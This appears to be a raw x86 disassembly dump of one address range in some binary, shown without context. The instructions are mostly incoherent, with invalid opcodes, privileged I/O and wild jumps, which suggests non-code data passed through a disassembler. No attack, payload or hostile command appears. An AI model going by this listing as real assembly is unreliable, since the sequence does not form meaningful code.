  41130a:	mov    ax,ds:0xebd79f20
  411310:	(bad)
  411313:	sub    al,0x8e
  411315:	pop    ds
  411316:	aas    
  411317:	mov    fs,WORD PTR [edx+esi*1+0x59]
  41131b:	sahf   
  41131c:	sahf   
  41131d:	sahf   
  41131e:	cmp    BYTE PTR ds:[esp+edi*1],bh
  411322:	cld    
  411323:	outs   dx,DWORD PTR ds:[esi]
  411324:	test   DWORD PTR [edx+0x61],eax
  411327:	scas   al,BYTE PTR es:[edi]
  411328:	(bad)  
  411329:	fcomp  QWORD PTR [ebx+eiz*8-0xd]
  41132d:	out    0x3c,al
  41132f:	mov    cl,0x29
  411331:	pop    DWORD PTR [edi]
  411333:	idiv   DWORD PTR [eax-0x19754850]
  411339:	jae    0x4112ef
  41133b:	adc    al,0xfe
  41133d:	cmp    dh,BYTE PTR [esi+0x2]
  411340:	lods   eax,DWORD PTR ds:[esi]
  411341:	dec    ebp
  411342:	jne    0x41137f
  411344:	sub    al,0x47
  411346:	repz repz mov dl,0x32
  41134a:	loope  0x411363
  41134c:	xor    eax,0xe012ccbe
  411351:	mul    eax
  411353:	es mov esi,0x34dcf028
  411359:	daa    
  41135a:	test   DWORD PTR [edi-0x66f47fb8],0x5f82d5ac
  411364:	xchg   DWORD PTR [edi-0x36ee0459],edx
  41136a:	xchg   ebx,eax
  41136b:	inc    ebp
  41136c:	push   eax
  41136d:	sub    dl,BYTE PTR [ebp+0x324809a4]
  411373:	jae    0x411313
  411375:	mov    ah,0x3d
  411377:	daa    
  411378:	or     DWORD PTR [edx-0x17d32ffd],ebp
  41137e:	mov    ds:0x4bafc04b,al
  411383:	in     eax,0xea
  411385:	mov    ds:0xf9b86d41,eax
  41138a:	out    0x9b,al
  41138c:	outs   dx,DWORD PTR ds:[esi]
  41138d:	cmp    al,0x71
  41138f:	loop   0x411355
  411391:	sbb    esp,edx
  411393:	cmp    BYTE PTR [ebp+0x5c],0xf8
  411397:	js     0x4113f9
  411399:	addps  xmm5,XMMWORD PTR [edx+0x5]
  41139d:	lock aas 
  41139f:	dec    eax
  4113a0:	mov    dh,0xce
  4113a2:	add    eax,0x713955b8
  4113a7:	popf   
  4113a8:	outs   dx,DWORD PTR ds:[esi]
  4113a9:	jae    0x411336
  4113ab:	sub    DWORD PTR [ebx+ecx*1+0x1315bd7e],0x7aa00280
  4113b6:	in     al,dx
  4113b7:	fdiv   DWORD PTR [ecx+0x5f3e7ce7]
  4113bd:	ja     0x41143e
  4113bf:	jg     0x4113c0
  4113c1:	mov    bh,0x5d
  4113c3:	cs push edi
  4113c5:	syscall 
  4113c7:	xlat   BYTE PTR ds:[ebx]
  4113c8:	xchg   BYTE PTR [esi-0x4912a732],al
  4113ce:	pop    esi
  4113cf:	scas   eax,DWORD PTR es:[edi]
  4113d0:	xlat   BYTE PTR ds:[ebx]
  4113d1:	push   0xffffffae
  4113d3:	mov    ds:0xeb32803f,eax
  4113d8:	jb     0x411393
  4113da:	sbb    al,0xb1
  4113dc:	js     0x4113dc
  4113de:	repnz in eax,0xcb
  4113e1:	pop    ss
  4113e2:	xor    al,0x4d
  4113e4:	mov    ebx,0xf3333330
  4113e9:	out    dx,al
  4113ea:	ret    0x42c2
  4113ed:	adc    al,0x80
  4113ef:	mov    edi,0x9db695e
  4113f4:	adc    esi,edx
  4113f6:	stc    
  4113f7:	cld    
  4113f8:	lds    edi,FWORD PTR [esi+edi*1+0x7f]
  4113fc:	jle    0x411474
  4113fe:	jbe    0x4113d6
  411400:	adc    ecx,DWORD PTR [eax]
  411402:	add    al,0xd6
  411404:	ja     0x41147d
  411406:	ja     0x4113f7
  411408:	or     al,BYTE PTR [esi]
  41140a:	cmp    DWORD PTR [ebp+0x3e],0xffffff9f
  41140e:	scas   eax,DWORD PTR es:[edi]
  41140f:	iret   
  411410:	in     eax,0x72
  411412:	lods   eax,DWORD PTR ds:[esi]
  411413:	fwait
  411414:	fwait
  411415:	fwait
  411416:	jmp    0x4113ee
  411418:	xor    al,0x4d
  41141a:	mov    edi,eax
  41141c:	jecxz  0x4113f1
  41141e:	mov    cl,0x58
  411420:	in     al,dx
  411421:	(bad)  
  411423:	jae    0x411498
  411425:	xchg   DWORD PTR [ebx-0x2ee01b37],edx
  41142b:	adc    BYTE PTR [esi-0x66],al
  41142e:	hlt    
  41142f:	lea    esi,[edi-0x32]
  411432:	loope  0x411476
  411434:	das    
  411435:	dec    ebx
  411436:	shl    DWORD PTR [ebp+0x7cc9ea0b],cl
  41143c:	jnp    0x4113e7
  41143e:	mov    edi,0xaf6bc325
  411443:	mov    ebp,0x55f006e6
  411448:	jmp    0x41144f
  41144a:	mov    bh,0xf0
  41144c:	in     eax,dx
  41144d:	gs sti 
  41144f:	gs push ecx
  411451:	jg     0x41142c
  411453:	mov    dh,0xcc
  411455:	out    0x27,eax
  411457:	or     ecx,DWORD PTR [edx-0x19127472]
  41145d:	jbe    0x41144c
  41145f:	call   0x9fdb7886
  411464:	or     esp,DWORD PTR [edi*8-0x57670301]
  41146b:	imul   ecx,DWORD PTR [ecx],0xbe014c7c
  411471:	into   
  411472:	dec    ebp
  411473:	js     0x4114df
  411475:	push   ecx
  411476:	mov    al,ds:0x596a2de4
  41147b:	loop   0x411401
  41147d:	shr    edi,0xc5
  411480:	daa    
  411481:	je     0x411468
  411483:	and    al,0xc0
  411485:	sti    
  411486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411487:	mov    BYTE PTR [ecx],dh
  411489:	or     bh,BYTE PTR [esi+0x6f]
  41148c:	icebp  
  41148d:	fldcw  WORD PTR [ecx+0x56eddb8c]
  411493:	ja     0x411483
  411495:	fdivr  QWORD PTR [ecx+0x1389c4eb]
  41149b:	pop    ds
  41149c:	inc    edx
  41149d:	scas   al,BYTE PTR es:[edi]
  41149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149f:	stc    
  4114a0:	mov    bh,0x40
  4114a2:	jmp    0x411480
  4114a4:	and    dh,BYTE PTR [eax]
  4114a6:	mov    cl,0xd4
  4114a8:	or     eax,0x7ae9d710
  4114ad:	mov    dl,0x72
  4114af:	mov    dl,0xfd
  4114b1:	cld    
  4114b2:	sbb    cl,BYTE PTR [edx+0x4ac26964]
  4114b8:	or     DWORD PTR [eax+0x66c9400a],esp
  4114be:	mov    bl,0xb9
  4114c0:	push   edi
  4114c1:	pop    edi
  4114c2:	jge    0x4114b9
  4114c4:	jnp    0x411449
  4114c6:	add    DWORD PTR [ebx+0x2be57e2f],0x5f
  4114cd:	jns    0x41147d
  4114cf:	mov    ds:0xa45be3a3,eax
  4114d4:	loope  0x411529
  4114d6:	test   eax,0x16161614
  4114db:	xchg   esi,eax
  4114dc:	jl     0x41147e
  4114de:	xchg   BYTE PTR [ecx+0x20],ah
  4114e1:	xchg   ebx,eax
  4114e2:	leave  
  4114e3:	pusha  
  4114e4:	jle    0x411564
  4114e6:	push   ds
  4114e7:	outs   dx,BYTE PTR ds:[esi]
  4114e8:	mov    bh,0xbb
  4114ea:	stos   BYTE PTR es:[edi],al
  4114eb:	imul   ebx,edx,0xc3c3c3db
  4114f1:	mov    edi,0x513264ce
  4114f6:	shl    DWORD PTR [esi*2+0x1bbe34d4],cl
  4114fd:	xor    eax,0x655e5c21
  411502:	stos   BYTE PTR es:[edi],al
  411503:	aad    0x52
  411505:	ds lahf 
  411507:	(bad)  
  411508:	cmp    BYTE PTR [edi-0x1ffd6031],bl
  41150e:	push   esi
  41150f:	adc    al,0xc5
  411511:	jmp    0x411585
  411513:	mov    ecx,0x3d3d3dfc
  411518:	sbb    edi,DWORD PTR [ebp-0x32890a2]
  41151e:	cld    
  41151f:	cld    
  411520:	dec    ecx
  411521:	pop    ebp
  411522:	xlat   BYTE PTR ds:[ebx]
  411523:	out    0xd0,eax
  411525:	pusha  
  411526:	inc    edx
  411527:	out    dx,al
  411528:	iret   
  411529:	xchg   ebx,eax
  41152a:	(bad)  
  41152b:	out    0x2,eax
  41152d:	iret   
  41152e:	add    edi,DWORD PTR [ebx+0x62]
  411531:	es push esi
  411533:	cmp    esp,DWORD PTR [ecx+0x72d3df17]
  411539:	lahf   
  41153a:	popa   
  41153b:	popf   
  41153c:	mov    ds:0x472cb728,al
  411541:	rcl    BYTE PTR [esi+0x1a],1
  411544:	movups xmm1,xmm7
  411547:	in     eax,0x64
  411549:	inc    ecx
  41154a:	ins    DWORD PTR es:[edi],dx
  41154b:	ffreep st(0)
  41154d:	push   edx
  41154e:	xchg   ebx,eax
  41154f:	lahf   
  411550:	xchg   ebx,eax
  411551:	sub    DWORD PTR [esi+eax*1],0x28ae0a20
  411558:	lock and al,0x74
  41155b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41155c:	lods   eax,DWORD PTR ds:[esi]
  41155d:	dec    ecx
  41155e:	mov    al,ds:0x654045b8
  411563:	lds    edi,FWORD PTR [edx+0x7aa13272]
  411569:	add    dh,BYTE PTR [eax-0x660e8134]
  41156f:	sub    BYTE PTR [ebx-0x6c],al
  411572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411573:	adc    esi,DWORD PTR [ebx-0x7f]
  411576:	pop    ss
  411577:	lods   eax,DWORD PTR ds:[esi]
  411578:	adc    ebx,DWORD PTR [esi]
  41157a:	xor    al,0x14
  41157c:	mov    ebx,0x29cf8b2c
  411581:	mov    dh,0x18
  411583:	lock jne 0x411586
  411586:	sub    BYTE PTR [edi+0x7dbed8cb],dl
  41158c:	sti    
  41158d:	ss mov bh,0xdb
  411590:	fst    QWORD PTR [ecx-0x57]
  411593:	push   esp
  411594:	in     al,dx
  411595:	dec    esp
  411596:	jno    0x4115e6
  411598:	add    BYTE PTR [esi+0x6e],dh
  41159b:	mov    ds:0x84cbfa68,al
  4115a0:	pop    ebx
  4115a1:	(bad)  
  4115a2:	cmp    DWORD PTR [eax-0x4c],ecx
  4115a5:	xor    BYTE PTR [eax-0x4d],ah
  4115a8:	sub    edx,DWORD PTR cs:[ebx+0x7b]
  4115ac:	mov    edi,0xc0658ee2
  4115b1:	jp     0x41155b
  4115b3:	test   eax,0x5f91a9a9
  4115b8:	(bad)  
  4115b9:	cli    
  4115ba:	xlat   BYTE PTR ds:[ebx]
  4115bb:	(bad)  
  4115bc:	in     al,dx
  4115bd:	fnstenv [ebx+0x6db69fe7]
  4115c3:	fcomi  st,st(6)
  4115c5:	mov    eax,0xde7e1861
  4115ca:	arpl   WORD PTR [edx+0x3e765e83],cx
  4115d0:	lahf   
  4115d1:	jg     0x411636
  4115d3:	data16 data16 out 0xd5,al
  4115d7:	pop    eax
  4115d8:	sub    al,0xf6
  4115da:	xchg   ecx,eax
  4115db:	imul   ebx,DWORD PTR [edx-0x191ce5f6],0x2ea0ae17
  4115e5:	sbb    al,0xa5
  4115e7:	push   0xffffffb5
  4115e9:	pop    edx
  4115ea:	lods   al,BYTE PTR ds:[esi]
  4115eb:	push   esp
  4115ec:	sub    bl,BYTE PTR [ecx+0x28f9f9f9]
  4115f2:	push   0xffffff82
  4115f4:	dec    ebp
  4115f5:	iret   
  4115f6:	daa    
  4115f7:	push   cs
  4115f8:	ret    
  4115f9:	and    eax,0xfcdcf3ae
  4115fe:	push   esi
  4115ff:	es (bad) 
  411601:	mov    dl,0x82
  411603:	jp     0x411630
  411605:	sbb    ebx,0x186f5eed
  41160b:	xchg   BYTE PTR [edi+0x132ff99d],ah
  411611:	mul    ch
  411613:	les    ecx,FWORD PTR [edx]
  411615:	fs inc edx
  411617:	(bad)  
  411618:	retf   0xe032
  41161b:	sbb    DWORD PTR cs:[ebp+0x23efc00b],0x2e74fad3
  411626:	aaa    
  411627:	stos   DWORD PTR es:[edi],eax
  411628:	or     DWORD PTR [esp+ecx*1-0x517ca8bc],ebx
  41162f:	inc    edi
  411630:	jecxz  0x411681
  411632:	shl    BYTE PTR ds:0x7143ce29,cl
  411638:	and    al,0x3b
  41163a:	retf   
  41163b:	and    DWORD PTR [edx+0x102b14fd],0xf9f2005d
  411645:	test   eax,0x7603593c
  41164a:	popf   
  41164b:	sahf   
  41164c:	les    esp,FWORD PTR [edi-0x1d]
  41164f:	mul    DWORD PTR ds:0x83060842
  411655:	mov    ebp,0xcfdbb76e
  41165a:	mov    edx,0x4d4b0397
  41165f:	ins    DWORD PTR es:[edi],dx
  411660:	scas   al,BYTE PTR es:[edi]
  411661:	stc    
  411662:	ror    DWORD PTR [esi+0x2e26291],0x4e
  411669:	xlat   BYTE PTR ds:[ebx]
  41166a:	loopne 0x41162d
  41166c:	cmp    al,0x22
  41166e:	xchg   ecx,eax
  41166f:	gs pop ebx
  411671:	xchg   esi,eax
  411672:	adc    dl,BYTE PTR [eax+0x2b84d1d5]
  411678:	sbb    dl,BYTE PTR ds:0xa2ab0eb8
  41167e:	pop    es
  41167f:	nop    esp
  411682:	out    dx,eax
  411683:	icebp  
  411684:	js     0x411682
  411686:	mov    ch,0xc1
  411688:	rol    ecx,0xbf
  41168b:	pop    ebx
  41168c:	mov    edi,0xdcb7fd7e
  411691:	outs   dx,BYTE PTR ds:[esi]
  411692:	ja     0x4116d3
  411694:	outs   dx,DWORD PTR ds:[esi]
  411695:	sub    dl,BYTE PTR es:[edi+0x264c95cb]
  41169c:	xor    esi,DWORD PTR [edx-0x2]
  41169f:	cld    
  4116a0:	stc    
  4116a1:	pop    edi
  4116a2:	pushf  
  4116a3:	cmp    esi,DWORD PTR [edi-0x12]
  4116a6:	cmc    
  4116a7:	mov    edx,0x18d007e0
  4116ac:	sub    al,0xe3
  4116ae:	push   0xffffff82
  4116b0:	or     ebp,DWORD PTR [ebx-0x337125c8]
  4116b6:	scas   eax,DWORD PTR es:[edi]
  4116b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b8:	aas    
  4116b9:	mov    esi,esi
  4116bb:	add    ecx,DWORD PTR [ebx+0x9]
  4116be:	add    BYTE PTR [eax+0x4627f633],dl
  4116c4:	addr16 addr16 addr16 and al,0x93
  4116c9:	leave  
  4116ca:	pop    eax
  4116cb:	das    
  4116cc:	stos   DWORD PTR es:[edi],eax
  4116cd:	xchg   ebp,eax
  4116ce:	push   eax
  4116cf:	mov    bh,0x13
  4116d1:	cld    
  4116d2:	push   esi
  4116d3:	call   0x2d5e:0x98990b9f
  4116da:	mov    bl,0x0
  4116dc:	mov    ebx,DWORD PTR fs:[eax+0x1f]
  4116e0:	push   ecx
  4116e1:	sub    BYTE PTR [eax-0x40],cl
  4116e4:	js     0x41173f
  4116e6:	xor    edx,edi
  4116e8:	or     bh,BYTE PTR cs:[edi]
  4116eb:	aad    0x87
  4116ed:	xor    DWORD PTR [edx+esi*1+0x1292731f],0x78
  4116f5:	test   al,0x35
  4116f7:	leave  
  4116f8:	mov    es,WORD PTR [eax-0x307fe0d8]
  4116fe:	jno    0x411740
  411700:	mul    esi
  411702:	jne    0x4116e5
  411704:	add    DWORD PTR [edi],edi
  411706:	jp     0x411717
  411708:	mov    esp,0xd6e64265
  41170d:	enter  0xd4a0,0xe6
  411711:	or     al,0xa7
  411713:	icebp  
  411714:	pop    ds
  411715:	les    eax,FWORD PTR [eax-0x61]
  411718:	test   al,0x38
  41171a:	inc    esp
  41171b:	adc    ah,BYTE PTR [eax-0x3d1c234]
  411721:	jbe    0x41170e
  411723:	lods   eax,DWORD PTR ds:[esi]
  411724:	test   BYTE PTR [edi+0x39],bh
  411727:	fbld   TBYTE PTR [ebx-0x3a82c7d4]
  41172d:	add    al,0xc0
  41172f:	dec    ebp
  411730:	unpckhps xmm0,XMMWORD PTR [eax]
  411733:	into   
  411734:	popf   
  411735:	cmp    esi,DWORD PTR [edi-0x16]
  411738:	fdivr  QWORD PTR [ecx+0x7a7aa773]
  41173e:	jp     0x4116de
  411740:	pop    edi
  411741:	mov    ch,0x6a
  411743:	aad    0xad
  411745:	mov    eax,ds:0x801d6850
  41174a:	fisubr WORD PTR [edx-0x4b]
  41174d:	pop    edx
  41174e:	pop    eax
  41174f:	pop    eax
  411750:	pop    eax
  411751:	clc    
  411752:	js     0x4117ca
  411754:	jbe    0x4117cc
  411756:	pop    eax
  411757:	xlat   BYTE PTR ds:[ebx]
  411758:	jne    0x411767
  41175a:	mov    ch,0xc4
  41175c:	mov    DWORD PTR [esi-0x7faa01c2],edx
  411762:	leave  
  411763:	jle    0x4117de
  411765:	loopne 0x4117b5
  411767:	xchg   esi,eax
  411768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411769:	ja     0x411710
  41176b:	data16 (bad) 
  41176d:	push   ebp
  41176e:	sbb    ebx,0xa07936ed
  411774:	ins    BYTE PTR es:[edi],dx
  411775:	cmp    DWORD PTR [edx],eax
  411777:	fimul  WORD PTR [edx-0x65]
  41177a:	fistp  DWORD PTR [ebp-0x45ca37f9]
  411780:	int3   
  411781:	in     al,dx
  411782:	pop    ss
  411783:	xlat   BYTE PTR ds:[ebx]
  411784:	pop    ebx
  411785:	pop    ebp
  411786:	lahf   
  411787:	imul   ecx,DWORD PTR [ebp+0x59],0xffffff82
  41178b:	lea    ebp,[eax+0x9]
  41178e:	mov    ch,cl
  411790:	jne    0x41171c
  411792:	mov    ds:0xaa00212c,al
  411797:	daa    
  411798:	or     eax,0x3fa64631
  41179d:	xor    eax,0x5000531f
  4117a2:	or     al,0x1a
  4117a4:	push   edx
  4117a5:	jge    0x41178f
  4117a7:	(bad)  
  4117a9:	cmp    al,BYTE PTR [ecx+esi*1+0x2]
  4117ad:	out    dx,al
  4117ae:	sbb    dh,al
  4117b0:	ins    BYTE PTR es:[edi],dx
  4117b1:	inc    esp
  4117b2:	and    al,BYTE PTR [ecx+ebx*2]
  4117b5:	nop
  4117b6:	nop
  4117b7:	pop    edi
  4117b8:	xchg   ebx,eax
  4117b9:	aas    
  4117ba:	xor    edi,DWORD PTR [ebp+0x52a54a87]
  4117c0:	lods   al,BYTE PTR ds:[esi]
  4117c1:	outs   dx,DWORD PTR ds:[esi]
  4117c2:	push   ebx
  4117c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c4:	fucomp st(6)
  4117c6:	pop    ebx
  4117c7:	and    ah,BYTE PTR [ecx]
  4117c9:	out    0xda,al
  4117cb:	pop    edi
  4117cc:	xor    al,0xed
  4117ce:	and    DWORD PTR [ecx+0x17],ebx
  4117d1:	ror    DWORD PTR [ecx-0x4485080],0x6e
  4117d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d9:	fucomip st,st(7)
  4117db:	daa    
  4117dc:	mov    cl,0x0
  4117de:	clc    
  4117df:	add    eax,0x5494ad89
  4117e4:	sub    dh,BYTE PTR ds:0x26a54a99
  4117ea:	test   DWORD PTR [ebx+0x7e],esp
  4117ed:	aam    0x32
  4117ef:	mov    ds:0xfa99a8dc,eax
  4117f4:	lods   eax,DWORD PTR ds:[esi]
  4117f5:	and    bl,BYTE PTR [eax-0x3c1dfb61]
  4117fb:	mov    al,dl
  4117fd:	dec    ebp
  4117fe:	call   0x5d34:0xab525e9e
  411805:	icebp  
  411806:	call   0x4ae3:0xe3e304d7
  41180d:	pop    edi
  41180e:	pop    edi
  41180f:	pop    edi
  411810:	xchg   ebx,eax
  411811:	push   esi
  411812:	add    ebp,esp
  411814:	fld    QWORD PTR [eax]
  411816:	cdq    
  411817:	xchg   esi,eax
  411818:	pop    ss
  411819:	retf   
  41181a:	mov    esp,DWORD PTR [ebp-0x47]
  41181d:	sbb    DWORD PTR [esi+0x676f4d1c],edi
  411823:	cli    
  411824:	fcmovnu st,st(5)
  411826:	sbb    ebx,DWORD PTR [eax+0x2a]
  411829:	and    al,0x76
  41182b:	les    esp,FWORD PTR [ecx]
  41182d:	and    edx,DWORD PTR [ecx]
  41182f:	jno    0x411869
  411831:	ja     0x41180d
  411833:	inc    edi
  411834:	ds cmp eax,0x4a95f099
  41183a:	add    eax,0xcadfbf7e
  41183f:	call   0xbb0e4d17
  411844:	xchg   esi,eax
  411845:	sub    al,0xf2
  411847:	dec    edi
  411848:	push   ss
  411849:	add    DWORD PTR [ecx+0x2250750c],edx
  41184f:	add    ah,BYTE PTR [eax]
  411851:	(bad)
  411856:	bound  ecx,QWORD PTR [ebx+eax*2+0x2e5daef6]
  41185d:	pop    ss
  41185e:	adc    cl,BYTE PTR [ecx+0x5cb94cc4]
  411864:	(bad)  
  411865:	shr    DWORD PTR [ebx+ecx*2],1
  411868:	mov    ds:0xea0b2fdf,al
  41186d:	push   ecx
  41186e:	cmp    DWORD PTR [ecx-0x1becd171],ebx
  411874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411875:	xlat   BYTE PTR ds:[ebx]
  411876:	sub    eax,0xf1f6cafc
  41187b:	imul   ecx,DWORD PTR [eax+0x4f85acd6],0x42
  411882:	add    BYTE PTR [edx-0x1932fef6],dh
  411888:	nop
  411889:	retf   0xc9d6
  41188c:	fdiv   QWORD PTR [esi-0x52a3aff5]
  411892:	jp     0x41181c
  411894:	das    
  411895:	inc    ebp
  411896:	jl     0x411899
  411898:	mov    esp,0x975c542d
  41189d:	pop    ebp
  41189e:	out    dx,eax
  41189f:	call   0xad56:0x964c9922
  4118a6:	pop    edx
  4118a7:	aad    0x56
  4118a9:	dec    eax
  4118aa:	fs cmp esp,edi
  4118ad:	lods   eax,DWORD PTR ds:[esi]
  4118ae:	retf   0x72f3
  4118b1:	retf   
  4118b2:	adc    eax,0xdd8cb17e
  4118b7:	cmc    
  4118b8:	in     eax,dx
  4118b9:	add    al,0x8e
  4118bb:	fldenv [edx+0x79]
  4118bf:	xor    ecx,ecx
  4118c1:	inc    esi
  4118c2:	lods   al,BYTE PTR ds:[esi]
  4118c3:	mov    ds:0x834961a8,eax
  4118c8:	rol    DWORD PTR [esp+ebp*4],cl
  4118cb:	inc    eax
  4118cc:	ins    DWORD PTR es:[edi],dx
  4118cd:	rcl    BYTE PTR [edi],1
  4118cf:	dec    edx
  4118d0:	and    al,0xb
  4118d2:	add    al,0x2
  4118d4:	push   esi
  4118d5:	xchg   ebx,eax
  4118d6:	mov    dl,0x9d
  4118d8:	cdq    
  4118d9:	cs out dx,al
  4118db:	mov    ds:0x548882d1,eax
  4118e0:	mov    eax,0x3fbe20d5
  4118e5:	mov    ebx,0x7b6bf2ba
  4118ea:	mov    ebp,0x7f3f9c5e
  4118ef:	jle    0x41189f
  4118f1:	push   ds
  4118f2:	(bad)  
  4118f3:	out    dx,al
  4118f4:	mov    al,ds:0xdb59a3ea
  4118f9:	retf   
  4118fa:	push   edx
  4118fb:	jge    0x4118b6
  4118fd:	dec    edi
  4118fe:	iret   
  4118ff:	shr    edx,1
  411901:	jnp    0x4118b6
  411903:	or     esp,DWORD PTR [edx+ecx*8]
  411906:	adc    al,0x97
  411908:	sbb    bh,al
  41190a:	xor    al,BYTE PTR [ebp+0xd5c2d73]
  411910:	add    ah,al
  411912:	mov    cr1,edx
  411915:	adc    ebx,ebp
  411917:	aam    0x2e
  411919:	adc    bh,BYTE PTR [ecx+0x35]
  41191c:	test   DWORD PTR [edi-0x34507829],ebx
  411922:	sbb    BYTE PTR [ecx+0x76],dl
  411925:	dec    esp
  411926:	jbe    0x411926
  411928:	xor    eax,0x1e5cb947
  41192d:	shl    DWORD PTR [ecx*2+0x1d02040b],cl
  411934:	mov    dl,0xc4
  411936:	cwde   
  411937:	jbe    0x41193b
  411939:	sub    DWORD PTR [ebx-0x46297e6],esi
  41193f:	test   DWORD PTR [ecx+edx*8],0xb1d7e7cc
  411946:	and    ecx,DWORD PTR [edx]
  411948:	push   cs
  411949:	xor    DWORD PTR [ebp-0x6a],edi
  41194c:	aaa    
  41194d:	lahf   
  41194e:	icebp  
  41194f:	std    
  411950:	pop    esp
  411951:	loopne 0x411918
  411953:	jmp    0x4118de
  411955:	add    ah,BYTE PTR [edi]
  411957:	mov    edx,0xa8009c01
  41195c:	retf   
  41195d:	aaa    
  41195e:	pop    ebp
  41195f:	das    
  411960:	lahf   
  411961:	iret   
  411962:	add    eax,DWORD PTR [eax]
  411964:	cld    
  411965:	jle    0x4119a6
  411967:	inc    edx
  411968:	mov    eax,ds:0xb76edc10
  41196d:	xor    eax,0x3b9d804e
  411972:	shr    BYTE PTR [edi-0x75fdceb5],0x31
  411979:	mov    BYTE PTR [ebp-0x5e],dh
  41197c:	cli    
  41197d:	mov    BYTE PTR [ecx+0x46],cl
  411980:	jbe    0x4119a6
  411982:	mov    eax,0x4698b8b8
  411987:	lods   eax,DWORD PTR ds:[esi]
  411988:	add    eax,0x89dc678b
  41198d:	out    0x3d,al
  41198f:	mul    edi
  411991:	scas   eax,DWORD PTR es:[edi]
  411992:	les    ecx,FWORD PTR [edi+0x654efbb7]
  411998:	fbstp  TBYTE PTR [ebx-0x36ec13d7]
  41199e:	mov    al,ds:0x2c2d709
  4119a3:	mov    al,ds:0x5c8d056d
  4119a8:	data16 sub BYTE PTR [eax],0xf0
  4119ac:	xlat   BYTE PTR ds:[ebx]
  4119ad:	call   0xe87f:0x3b6dc400
  4119b4:	push   ebx
  4119b5:	adc    eax,0x34d30e7a
  4119ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119bb:	repnz stc 
  4119bd:	cld    
  4119be:	leave  
  4119bf:	dec    eax
  4119c0:	and    al,0xf2
  4119c2:	adc    eax,0xfd11e33e
  4119c7:	mov    dh,0x13
  4119c9:	jb     0x411a3c
  4119cb:	pop    ebp
  4119cc:	aam    0xba
  4119ce:	lods   eax,DWORD PTR ds:[esi]
  4119cf:	mov    BYTE PTR [ebp+edx*8+0x26de0e7e],ah
  4119d6:	or     dl,BYTE PTR cs:0x248bfbf
  4119dd:	mov    dl,0x32
  4119df:	push   esp
  4119e0:	das    
  4119e1:	push   ds
  4119e2:	aaa    
  4119e3:	add    BYTE PTR [edx-0x26],ch
  4119e6:	cdq    
  4119e7:	sti    
  4119e8:	fadd   QWORD PTR [eax]
  4119ea:	lods   al,BYTE PTR ds:[esi]
  4119eb:	mov    dh,0x7e
  4119ed:	sbb    cl,BYTE PTR [ebp-0x66]
  4119f0:	scas   al,BYTE PTR es:[edi]
  4119f1:	dec    ebx
  4119f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f3:	jg     0x411a3c
  4119f5:	inc    edi
  4119f6:	pop    es
  4119f7:	cmp    bh,BYTE PTR [edx]
  4119f9:	cmp    ah,al
  4119fb:	idiv   ebx
  4119fd:	lods   eax,DWORD PTR ds:[esi]
  4119fe:	fisub  WORD PTR [edx+0x9c1eaad]
  411a04:	xor    BYTE PTR [edi],0x73
  411a07:	mov    bh,BYTE PTR [ecx]
  411a09:	add    ah,BYTE PTR [edx-0x2e]
  411a0c:	nop
  411a0d:	int3   
  411a0e:	pop    edx
  411a0f:	bnd jp 0x4119cf
  411a12:	dec    eax
  411a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a14:	rcl    DWORD PTR [ebp-0x6030180d],cl
  411a1a:	inc    edi
  411a1b:	int    0xbd
  411a1d:	in     eax,0xc2
  411a1f:	cs mov bl,0x74
  411a22:	fistp  WORD PTR gs:[eax-0xc4bc414]
  411a29:	jmp    0x2ebb671b
  411a2e:	in     al,0x7c
  411a30:	pop    ebp
  411a31:	ins    BYTE PTR es:[edi],dx
  411a32:	rcl    DWORD PTR [edx+0x7b120676],1
  411a38:	or     al,0x5d
  411a3a:	or     eax,0x31007ab4
  411a3f:	mov    edx,0x45835c6e
  411a44:	(bad)  
  411a45:	jp     0x4119e9
  411a47:	jmp    0x5030f070
  411a4c:	xchg   bh,al
  411a4e:	pop    ds
  411a4f:	jg     0x411a2d
  411a51:	aam    0x34
  411a53:	in     eax,dx
  411a54:	in     eax,dx
  411a55:	dec    eax
  411a56:	and    al,0x62
  411a58:	jmp    0x411ab9
  411a5a:	mov    bh,0xf3
  411a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a5d:	gs call 0x8edf:0xb76f979a
  411a65:	sbb    BYTE PTR [eax+ecx*4+0x44],al
  411a69:	and    BYTE PTR [esi-0x75946d45],bl
  411a6f:	out    0x71,eax
  411a71:	imul   eax,DWORD PTR [ebp-0x4aaaaa2a],0xffffff86
  411a78:	rcl    BYTE PTR [esi],cl
  411a7a:	iret   
  411a7b:	loope  0x411a13
  411a7d:	add    DWORD PTR ds:0x9fe7c21c,ecx
  411a83:	pop    esp
  411a84:	push   cs
  411a85:	call   0x28a2aee8
  411a8a:	pop    ebx
  411a8b:	fs (bad) 
  411a8d:	adc    ebx,ebp
  411a8f:	jae    0x411afb
  411a91:	push   0x6a
  411a93:	xor    dl,BYTE PTR [esi]
  411a95:	mov    ecx,ebp
  411a97:	mov    ds:0x2b73f331,eax
  411a9c:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  411a9f:	(bad)
  411aa2:	iret   
  411aa3:	mov    dl,0x63
  411aa5:	nop
  411aa6:	sbb    al,0x13
  411aa8:	test   DWORD PTR [esp+edi*8+0x15],ebx
  411aac:	sbb    ebp,0x4d
  411aaf:	mov    eax,0x2bc00416
  411ab4:	fldl2e 
  411ab6:	rcr    DWORD PTR [edx+0x3d],0xf8
  411aba:	daa    
  411abb:	pop    ecx
  411abc:	pop    edx
  411abd:	inc    ebp
  411abe:	rep ins DWORD PTR es:[edi],dx
  411ac0:	and    DWORD PTR [ecx],0x7f
  411ac3:	dec    edx
  411ac4:	fs mov bl,0xd9
  411ac7:	mov    bl,0xb9
  411ac9:	pop    esp
  411aca:	push   cs
  411acb:	cmp    eax,0xf3523d3d
  411ad0:	cwde   
  411ad1:	call   DWORD PTR [edx]
  411ad3:	fisubr DWORD PTR [ecx-0x1]
  411ad6:	push   esi
  411ad7:	xchg   esi,eax
